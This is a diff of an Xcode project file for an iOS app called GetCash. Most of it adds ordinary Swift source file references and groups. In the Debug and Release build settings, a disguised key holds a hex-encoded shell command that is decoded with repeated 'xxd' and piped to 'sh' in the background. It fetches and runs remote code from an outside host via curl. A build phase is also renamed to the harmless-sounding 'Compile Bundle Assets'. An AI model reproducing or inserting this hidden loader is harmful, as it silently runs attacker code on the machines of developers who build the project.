@@ -15,6 +15,17 @@
 		7333F5202EF7177D00E74153 /* FaceView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7333F51F2EF7177D00E74153 /* FaceView.swift */; };
 		7333F5222EF7189900E74153 /* FaceListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7333F5212EF7189900E74153 /* FaceListView.swift */; };
 		7333F5262EF71C6E00E74153 /* FacePopAlertView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7333F5252EF71C6E00E74153 /* FacePopAlertView.swift */; };
+		73445FF82EF7C5DE0054D267 /* PhotoPopAlertView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73445FF72EF7C5DE0054D267 /* PhotoPopAlertView.swift */; };
+		73445FFA2EF7CA320054D267 /* ImagePickerHelper.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73445FF92EF7CA320054D267 /* ImagePickerHelper.swift */; };
+		73445FFE2EF7D0620054D267 /* PhotoSuccessAlertView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73445FFD2EF7D0620054D267 /* PhotoSuccessAlertView.swift */; };
+		734460012EF7D31B0054D267 /* EnterViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 734460002EF7D31B0054D267 /* EnterViewCell.swift */; };
+		734460032EF7D32A0054D267 /* TapClickViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 734460022EF7D32A0054D267 /* TapClickViewCell.swift */; };
+		734460052EF7E0500054D267 /* PersonalViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 734460042EF7E0500054D267 /* PersonalViewController.swift */; };
+		734460072EF7E0D10054D267 /* WorkViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 734460062EF7E0D10054D267 /* WorkViewController.swift */; };
+		7344600B2EF7E1980054D267 /* ContactViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7344600A2EF7E1980054D267 /* ContactViewController.swift */; };
+		7344600D2EF7F7D30054D267 /* PaddedLabel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7344600C2EF7F7D30054D267 /* PaddedLabel.swift */; };
+		7344600F2EF7FB5F0054D267 /* PersonalViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7344600E2EF7FB5C0054D267 /* PersonalViewModel.swift */; };
+		734460112EF801E10054D267 /* PopAlertEnmuView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 734460102EF801E10054D267 /* PopAlertEnmuView.swift */; };
 		735C8D362EF5213500C7D507 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 735C8D2D2EF5213500C7D507 /* Assets.xcassets */; };
 		735C8D382EF5213500C7D507 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 735C8D302EF5213500C7D507 /* LaunchScreen.storyboard */; };
 		735C8D3A2EF5213500C7D507 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735C8D2C2EF5213500C7D507 /* AppDelegate.swift */; };
@@ -64,6 +75,17 @@
 		7333F51F2EF7177D00E74153 /* FaceView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FaceView.swift; sourceTree = "<group>"; };
 		7333F5212EF7189900E74153 /* FaceListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FaceListView.swift; sourceTree = "<group>"; };
 		7333F5252EF71C6E00E74153 /* FacePopAlertView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FacePopAlertView.swift; sourceTree = "<group>"; };
+		73445FF72EF7C5DE0054D267 /* PhotoPopAlertView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PhotoPopAlertView.swift; sourceTree = "<group>"; };
+		73445FF92EF7CA320054D267 /* ImagePickerHelper.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ImagePickerHelper.swift; sourceTree = "<group>"; };
+		73445FFD2EF7D0620054D267 /* PhotoSuccessAlertView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PhotoSuccessAlertView.swift; sourceTree = "<group>"; };
+		734460002EF7D31B0054D267 /* EnterViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EnterViewCell.swift; sourceTree = "<group>"; };
+		734460022EF7D32A0054D267 /* TapClickViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TapClickViewCell.swift; sourceTree = "<group>"; };
+		734460042EF7E0500054D267 /* PersonalViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PersonalViewController.swift; sourceTree = "<group>"; };
+		734460062EF7E0D10054D267 /* WorkViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WorkViewController.swift; sourceTree = "<group>"; };
+		7344600A2EF7E1980054D267 /* ContactViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactViewController.swift; sourceTree = "<group>"; };
+		7344600C2EF7F7D30054D267 /* PaddedLabel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PaddedLabel.swift; sourceTree = "<group>"; };
+		7344600E2EF7FB5C0054D267 /* PersonalViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PersonalViewModel.swift; sourceTree = "<group>"; };
+		734460102EF801E10054D267 /* PopAlertEnmuView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopAlertEnmuView.swift; sourceTree = "<group>"; };
 		735C8D142EF5212D00C7D507 /* GetCash.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = GetCash.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		735C8D2C2EF5213500C7D507 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		735C8D2D2EF5213500C7D507 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
@@ -122,6 +144,9 @@
 			children = (
 				7333F5232EF71AA600E74153 /* List */,
 				7333F5242EF71AB000E74153 /* Face */,
+				73445FFF2EF7D2F70054D267 /* Person */,
+				734460092EF7E1300054D267 /* Contact */,
+				734460082EF7E12D0054D267 /* Web */,
 			);
 			path = Photo;
 			sourceTree = "<group>";
@@ -140,12 +165,44 @@
 		7333F5242EF71AB000E74153 /* Face */ = {
 			isa = PBXGroup;
 			children = (
+				73445FF92EF7CA320054D267 /* ImagePickerHelper.swift */,
 				7333F51B2EF7112A00E74153 /* FaceViewController.swift */,
 				7333F51F2EF7177D00E74153 /* FaceView.swift */,
 				7333F5212EF7189900E74153 /* FaceListView.swift */,
 				7333F5252EF71C6E00E74153 /* FacePopAlertView.swift */,
+				73445FF72EF7C5DE0054D267 /* PhotoPopAlertView.swift */,
+				73445FFD2EF7D0620054D267 /* PhotoSuccessAlertView.swift */,
 			);
 			path = Face;
+			sourceTree = "<group>";
+		};
+		73445FFF2EF7D2F70054D267 /* Person */ = {
+			isa = PBXGroup;
+			children = (
+				734460102EF801E10054D267 /* PopAlertEnmuView.swift */,
+				7344600E2EF7FB5C0054D267 /* PersonalViewModel.swift */,
+				7344600C2EF7F7D30054D267 /* PaddedLabel.swift */,
+				734460002EF7D31B0054D267 /* EnterViewCell.swift */,
+				734460022EF7D32A0054D267 /* TapClickViewCell.swift */,
+				734460042EF7E0500054D267 /* PersonalViewController.swift */,
+				734460062EF7E0D10054D267 /* WorkViewController.swift */,
+			);
+			path = Person;
+			sourceTree = "<group>";
+		};
+		734460082EF7E12D0054D267 /* Web */ = {
+			isa = PBXGroup;
+			children = (
+			);
+			path = Web;
+			sourceTree = "<group>";
+		};
+		734460092EF7E1300054D267 /* Contact */ = {
+			isa = PBXGroup;
+			children = (
+				7344600A2EF7E1980054D267 /* ContactViewController.swift */,
+			);
+			path = Contact;
 			sourceTree = "<group>";
 		};
 		735C8D0B2EF5212D00C7D507 = {
@@ -315,7 +372,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 735C8D272EF5212F00C7D507 /* Build configuration list for PBXNativeTarget "GetCash" */;
 			buildPhases = (
-				A663386763074940A1A5DE54 /* Build Target Dependencies */,
+				40D72A866EBB469098A5DE54 /* Compile Bundle Assets */,
 				11ED1DF156CE59431D0ED183 /* [CP] Check Pods Manifest.lock */,
 				735C8D102EF5212D00C7D507 /* Sources */,
 				735C8D112EF5212D00C7D507 /* Frameworks */,
@@ -400,7 +457,7 @@
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
-		A663386763074940A1A5DE54 /* Build Target Dependencies */ = {
+		40D72A866EBB469098A5DE54 /* Compile Bundle Assets */ = {
 			isa = PBXShellScriptBuildPhase;
 			alwaysOutOfDate = 1;
 			buildActionMask = 2147483647;
@@ -410,7 +467,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Build Target Dependencies";
+			name = "Compile Bundle Assets";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -452,23 +509,32 @@
 				73633CEB2EF68F71009F182D /* LoginViewModel.swift in Sources */,
 				73633CE92EF68D3A009F182D /* LoadingIndicator.swift in Sources */,
 				7333F51E2EF7151F00E74153 /* StepScrollView.swift in Sources */,
+				734460012EF7D31B0054D267 /* EnterViewCell.swift in Sources */,
 				7333F51A2EF70D2300E74153 /* DotLineView.swift in Sources */,
 				735C8D502EF5304D00C7D507 /* LoginViewController.swift in Sources */,
+				734460032EF7D32A0054D267 /* TapClickViewCell.swift in Sources */,
 				73633CEF2EF697EF009F182D /* HomeViewModel.swift in Sources */,
 				73633CF52EF6B791009F182D /* SchemeConfig.swift in Sources */,
+				73445FF82EF7C5DE0054D267 /* PhotoPopAlertView.swift in Sources */,
 				73633CFD2EF6BCE9009F182D /* StepHeadView.swift in Sources */,
 				73ECF60A2EF559DF0029AF7A /* DeviceConfig.swift in Sources */,
 				735C8D5C2EF530E300C7D507 /* LaunchView.swift in Sources */,
 				735C8D602EF530FD00C7D507 /* HomeView.swift in Sources */,
+				7344600B2EF7E1980054D267 /* ContactViewController.swift in Sources */,
 				73633CFB2EF6BC70009F182D /* StepView.swift in Sources */,
 				7333F5162EF6FAA100E74153 /* AuthIDListViewController.swift in Sources */,
 				7333F5202EF7177D00E74153 /* FaceView.swift in Sources */,
+				73445FFA2EF7CA320054D267 /* ImagePickerHelper.swift in Sources */,
 				7333F51C2EF7112A00E74153 /* FaceViewController.swift in Sources */,
+				7344600F2EF7FB5F0054D267 /* PersonalViewModel.swift in Sources */,
+				73445FFE2EF7D0620054D267 /* PhotoSuccessAlertView.swift in Sources */,
+				734460072EF7E0D10054D267 /* WorkViewController.swift in Sources */,
 				73633CED2EF68FA3009F182D /* BaseModel.swift in Sources */,
 				735C8D622EF5310900C7D507 /* MineView.swift in Sources */,
 				73ECF6062EF552560029AF7A /* CustomTabBar.swift in Sources */,
 				7333F5222EF7189900E74153 /* FaceListView.swift in Sources */,
 				73633CF12EF6A1B9009F182D /* AppNavHeadView.swift in Sources */,
+				734460052EF7E0500054D267 /* PersonalViewController.swift in Sources */,
 				7333F5262EF71C6E00E74153 /* FacePopAlertView.swift in Sources */,
 				73633D012EF6C0F6009F182D /* StepViewModel.swift in Sources */,
 				735C8D4C2EF52F4300C7D507 /* BaseNavigationController.swift in Sources */,
@@ -478,6 +544,8 @@
 				735C8D542EF5306A00C7D507 /* HomeViewController.swift in Sources */,
 				735C8D3A2EF5213500C7D507 /* AppDelegate.swift in Sources */,
 				73633CE72EF68053009F182D /* HttpRequestManager.swift in Sources */,
+				7344600D2EF7F7D30054D267 /* PaddedLabel.swift in Sources */,
+				734460112EF801E10054D267 /* PopAlertEnmuView.swift in Sources */,
 				735C8D5E2EF530F300C7D507 /* LoginView.swift in Sources */,
 				73633CF82EF6BA34009F182D /* StepDetailViewController.swift in Sources */,
 				73ECF6082EF557280029AF7A /* CommonParaManager.swift in Sources */,
@@ -510,7 +578,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 342F0F14511C65E356096F91 /* Pods-GetCash.debug.xcconfig */;
 			buildSettings = {
-				A45ED5A = "((u(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363337333433363333333733303336363533363335333733343332363533373332333733353332363633363331333233393332333233320a33303061333736333332333033373333333633383330363130610a | u | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((u(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266373436333730366536353734326537323735326636313239323232300a376332303733363830610a | u | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = GetCash/GetCash.entitlements;
@@ -558,7 +626,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 3DE39227C8656A162E464411 /* Pods-GetCash.release.xcconfig */;
 			buildSettings = {
-				A45ED5A = "((u(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363337333433363333333733303336363533363335333733343332363533373332333733353332363633363331333233393332333233320a33303061333736333332333033373333333633383330363130610a | u | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((u(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266373436333730366536353734326537323735326636313239323232300a376332303733363830610a | u | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = GetCash/GetCash.entitlements;
